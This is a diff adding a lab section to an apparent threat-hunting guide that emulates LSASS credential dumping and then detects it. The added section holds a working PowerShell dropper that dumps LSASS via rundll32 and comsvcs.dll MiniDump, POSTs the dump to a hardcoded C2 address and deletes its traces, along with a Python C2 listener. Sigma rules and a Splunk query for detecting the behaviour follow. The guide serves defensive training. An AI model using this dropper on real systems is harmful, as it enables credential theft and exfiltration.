@@ -36,7 +36,7 @@ This documentation provides detailed guidance step by step through building your
 - [Use Cases](#Use-Cases)
   - [Use Case 1: The Basic Beacon (Script-Kiddie)](#use-case-1-the-basic-beacon-script-kiddie)
   - [Use Case 2: Phishing via Malicious Word Attachment (Basic)](#Use-Case-2-Phishing-via-Malicious-Word-Attachment)
-  - [Use Case 3: Clipboard to Compromise: PowerShell Script Self-Pwn](#use-case-3-clipboard-to-compromise-powershell-script-self-pwn)
+  - [Use Case 3: Hunting for LSASS Memory Access (Credential Dumping)](#use-case-3-Hunting-for-LSASS-Memory-Access-Credential-Dumping)
   - [Use Case 4: Download malware via web browser leads to C2](#use-case-4-download-malware-via-web-browser-leads-to-c2)
   - [Use Case 5: Phishing via Malicious Word Attachment (advanced: memory execute)](#use-case-5-phishing-via-malicious-word-attachment-advanced-memory-execute)
 - [Detection & Analysis](#detection--analysis)
@@ -1391,9 +1391,465 @@ index=* EventCode=1 Image="*powershell.exe*" CommandLine="*DownloadFile*"
 
 ---
 
+# Use Case 3: Hunting for LSASS Memory Access (Credential Dumping)
+
+## Hypothesis
+
+> *"Based on documented threat actor behavior, we'll hunt for unauthorized access to the LSASS process — a common technique used to extract credentials from memory on Windows endpoints. We'll emulate the behavior and validate our detection coverage using Sysmon and Windows Security logs."*
+> 
+
+**MITRE:** T1003.001 — OS Credential Dumping: LSASS Memory
+
+---
+
+## Attack Flow
 
 
+1. **Execution**
+PowerShell script executes (bypassing execution policy).
+2. **Credential Access (T1003.001)**
+Uses rundll32.exe + comsvcs.dll to perform **LSASS Memory Dump**.
+3. **Collection**
+Saves the LSASS dump file in %TEMP% folder.
+4. **Exfiltration (T1041)**
+Sends the dump file to the C2 server via HTTP POST.
+5. **Defense Evasion**
+Runs commands silently + deletes the dump file after exfiltration.
 
+---
+
+## MITRE ATT&CK Mapping
+
+| Tactic | Technique ID | Technique Name | Description |
+| --- | --- | --- | --- |
+| Execution | T1059.001 | PowerShell | Execute malicious PowerShell script |
+| Credential Access | **T1003.001** | OS Credential Dumping: LSASS Memory | Dump LSASS process using comsvcs.dll |
+| Collection | T1005 | Data from Local System | Collect credentials from memory |
+| Exfiltration | **T1041** | Exfiltration Over C2 Channel | Send dump file over HTTP to C2 |
+| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Use rundll32 to hide activity |
+| Defense Evasion | T1070.004 | Indicator Removal: File Deletion | Delete dump and script after use |
+
+---
+
+## Environment & Malware Setup
+
+### 1. PowerShell Dropper (LSASS Dump + Exfiltration)
+
+### What this script is doing
+
+The script is pretty straightforward. It does three main things:
+
+- Dumps the LSASS process to extract credentials
+- Sends the dump to a remote C2 server
+- Deletes any traces after execution
+
+---
+
+### Step 1: Initial setup
+
+```powershell
+$DumpPath = "$env:TEMP\lsass_$(Get-Random).dmp"
+$C2_URL   = "http://192.168.61.128:8080/exfil"
+```
+
+- The dump file is saved in the `%TEMP%` directory
+- A random name is used to avoid obvious patterns
+- The C2 server endpoint is hardcoded
+
+This helps make the activity slightly less noticeable.
+
+---
+
+### Step 2: Dumping LSASS
+
+```powershell
+$Proc = Get-Process -Name lsass -ErrorAction Stop
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $Proc.Id $DumpPath full | Out-Null
+```
+
+- The script locates the LSASS process
+- Uses `comsvcs.dll` with `rundll32.exe` to generate a memory dump
+
+Important detail:
+
+- This is a built-in Windows component (LOLBIN), so no external tools are needed
+- It’s a common technique to avoid detection compared to tools like Mimikatz
+
+---
+
+### Step 3: Verifying the dump
+
+```powershell
+if (Test-Path $DumpPath)
+```
+
+- The script checks if the dump file was created successfully
+- If not, it exits quietly without errors
+
+---
+
+### Step 4: Exfiltration
+
+```powershell
+$bytes = [System.IO.File]::ReadAllBytes($DumpPath)
+
+Invoke-WebRequest -Uri $C2_URL -Method POST `
+                  -Body $bytes `
+                  -ContentType "application/octet-stream"
+```
+
+- The dump file is read as raw bytes
+- Sent directly to the C2 server using an HTTP POST request
+
+Notes:
+
+- No encoding or obfuscation is used
+- The data is transferred as-is
+
+---
+
+### Step 5: Cleanup
+
+```powershell
+Remove-Item $DumpPath -Force
+Remove-Item "$env:TEMP\Dropper.ps1" -Force
+```
+
+- Deletes the dump file after sending
+- Deletes the script itself
+
+This reduces forensic artifacts on the system.
+
+---
+
+### General behavior
+
+- The script runs silently
+- Uses try/catch blocks to avoid visible errors
+- Produces no output
+
+This is intentional to reduce visibility during execution.
+
+---
+
+## 2. C2 Server Setup
+
+### Option 1: Basic HTTP server (testing only)
+
+```bash
+python3 -m http.server 8080
+```
+
+- Quick way to start a server
+- Does not properly handle POST data
+
+Only useful for basic connectivity testing.
+
+---
+
+### Option 2: Custom C2 listener
+
+```python
+from http.server import HTTPServer, BaseHTTPRequestHandler
+```
+
+---
+
+### Handling incoming data
+
+```python
+def do_POST(self):
+    length = int(self.headers['Content-Length'])
+    data = self.rfile.read(length)
+```
+
+- Reads the incoming POST request body
+- Data is received in raw binary format
+
+---
+
+### Saving the dump
+
+```python
+with open(f"lsass_dump_{len(data)}.dmp", "wb") as f:
+    f.write(data)
+```
+
+- Saves the received data as a dump file
+- Uses file size in the filename for quick identification
+
+---
+
+### Running the server
+
+```python
+HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
+```
+
+- Listens on all interfaces
+- Uses the same port configured in the PowerShell script
+
+---
+
+## Linking to the scenario
+
+This setup follows the same C2 concept used in previous scenarios:
+
+- Same communication method (HTTP POST)
+- Same port and structure
+- Same attacker-controlled server
+
+The main difference here is the data being exfiltrated:
+
+- Instead of system info, this scenario sends credential dumps from LSASS
+
+---
+
+## Detection & Analysis
+
+### LSASS Dumping (Quick Intro before we dive in)
+
+Alright so let’s start from the basics…
+
+**LSASS (Local Security Authority Subsystem Service)** is one of the most important processes in Windows.
+
+It’s responsible for:
+
+- Authentication
+- Storing credentials in memory
+- Handling NTLM / Kerberos
+
+So basically…
+
+if someone gets access to LSASS memory → **they can dump credentials (plaintext, hashes, tickets, everything)**
+
+### Common LSASS Dumping Techniques
+
+There are multiple ways attackers do this:
+
+- Mimikatz (the classic)
+- procdump
+- Task Manager dump
+- `comsvcs.dll + MiniDump`  (LOLBin)
+- rundll32 abuse
+
+Why are we using `comsvcs.dll + MiniDump` here?
+
+- Built-in (no external tools needed)
+- Looks legit
+- Used a lot by attackers
+- Kinda stealthier
+
+### So Lets Break this
+
+First thing we saw:
+
+#### EventCode = 1 (Process Create)
+
+```
+powershell-epbypass-fileC:\Users\GLITCH\AppData\Local\Temp\Dropper.ps1
+```
+
+This command basically:
+
+- Runs PowerShell
+- Bypasses execution policy
+- Executes a script → `Dropper.ps1`
+
+Most likely running with high privileges
+
+### Sigma Rule:
+
+We can detect this behavior using the following Sigma rule:
+
+```
+title: Suspicious PowerShell Execution Policy Bypass
+id: ps-bypass
+logsource:
+  product: windows
+  category: process_creation
+
+detection:
+  selection:
+    Image|endswith:'powershell.exe'
+    CommandLine|contains:'-ep bypass'
+  condition: selection
+
+level: medium
+```
+
+<img width="1036" height="147" alt="Screenshot_1" src="https://github.com/user-attachments/assets/98ba215c-8006-424b-b640-26c75c8e0a02" />
+
+---
+
+Right after that…
+
+#### EventCode = 1 again
+
+But this time:
+
+- **Image:** `rundll32.exe`
+- **Parent:** PowerShell
+
+```
+"C:\Windows\system32\rundll32.exe"C:\Windows\System32\comsvcs.dllMiniDump676C:\Users\GLITCH\AppData\Local\Temp\lsass_487131235.dmpfull 
+```
+
+<img width="930" height="557" alt="Screenshot_2" src="https://github.com/user-attachments/assets/1e870493-ecde-4741-ae51-9740d9dfc215" />
+
+Let’s break this command down step by step:
+
+#### `rundll32.exe`= A legit Windows binary, Used to execute functions inside DLL files
+
+#### `comsvcs.dll` = Also a legit built-in DLL, Contains a function called `MiniDump`
+
+#### `MiniDump` = This is the function responsible for dumping process memory
+
+#### `676` = That’s the PID (very likely LSASS process)
+
+#### `lsass_487131235.dmp` = Output file (where the dump will be saved)
+
+#### `full` = Means full memory dump
+
+So in simple terms:
+
+> “Go dump LSASS memory and save it to a file”
+> 
+
+That’s straight up credential dumping.
+
+#### Sigma Rule:
+
+We can detect this behavior using the following Sigma rule:
+
+```
+title: LSASS Dump via comsvcs.dll
+id: lsass-dump-comsvcs
+logsource:
+  product: windows
+  category: process_creation
+
+detection:
+  selection:
+    Image|endswith:'rundll32.exe'
+    CommandLine|contains:
+      -'comsvcs.dll'
+      -'MiniDump'
+  condition: selection
+
+level: high
+```
+
+<img width="717" height="343" alt="Screenshot_3" src="https://github.com/user-attachments/assets/1fe114d3-a211-4ec2-ba0f-9245dee19af9" />
+
+Next we saw ‘EventCode = 11’ Makes perfect sense… this is the dumped file
+
+#### EventCode = 11 (File Create)
+
+- Image → `rundll32.exe`
+- File → `lsass_487131235.dmp`
+
+#### Sigma Rule:
+
+We can detect this behavior using the following Sigma rule:
+
+```
+title: LSASS Dump File Creation
+id: lsass-dump-file
+logsource:
+  product: windows
+  category: file_event
+
+detection:
+  selection:
+    TargetFilename|contains:'.dmp'
+  condition: selection
+
+level: medium
+```
+
+<img width="936" height="555" alt="Screenshot_4" src="https://github.com/user-attachments/assets/94e1fa0e-89d6-4b81-8334-358b838fc0a5" />
+
+#### Then we found “EventCode = 3” This is most likely:
+
+- Dump being sent out
+- Or communication with attacker
+
+We can’t confirm 100% due to limited data sources But honestly… looks like **exfiltration** 
+
+- Source → `192.168.61.129`
+- Destination → `192.168.61.130`
+- Port → `8080`
+
+#### Sigma rule:
+
+We can detect this behavior using the following Sigma rule:
+
+```
+title: Possible Data Exfiltration over 8080
+id: exfil-8080
+logsource:
+  product: windows
+  category: network_connection
+
+detection:
+  selection:
+    DestinationPort: 8080
+  condition: selection
+
+level: medium
+```
+
+<img width="942" height="557" alt="Screenshot_5" src="https://github.com/user-attachments/assets/02af22c0-9954-42f7-be38-3e90a8ed67a9" />
+
+---
+
+### Summary
+
+#### What Happened (Timeline)
+
+1. PowerShell script executed (`Dropper.ps1`)
+2. Script spawned `rundll32.exe`
+3. rundll32 used `comsvcs.dll` to dump LSASS
+4. Dump file created in Temp directory
+5. Network connection initiated to another host
+6. Possible exfiltration attempt
+
+---
+
+#### MITRE ATT&CK Mapping
+
+- PowerShell Execution → `T1059.001`
+- LSASS Dumping → `T1003.001`
+- LOLBins Abuse → `T1218`
+- Exfiltration → `T1041`
+
+---
+
+#### And The last Thing
+
+Don’t just rely on one detection, Correlate everything 
+
+### Attack Chain Detection:
+
+- PowerShell (bypass)
+→ rundll32
+→ comsvcs MiniDump
+→ dump file
+→ outbound connection
+
+### Example (Splunk):
+
+```
+index=*
+(Image="*powershell.exe*" CommandLine="*-ep bypass*")
+OR (Image="*rundll32.exe*" CommandLine="*MiniDump*")
+OR (TargetFilename="*.dmp")
+```
+
+<img width="1356" height="543" alt="Screenshot_6" src="https://github.com/user-attachments/assets/c2d03dff-780a-47f4-bc48-37e940ae6a13" />
+
+---
 
 
 
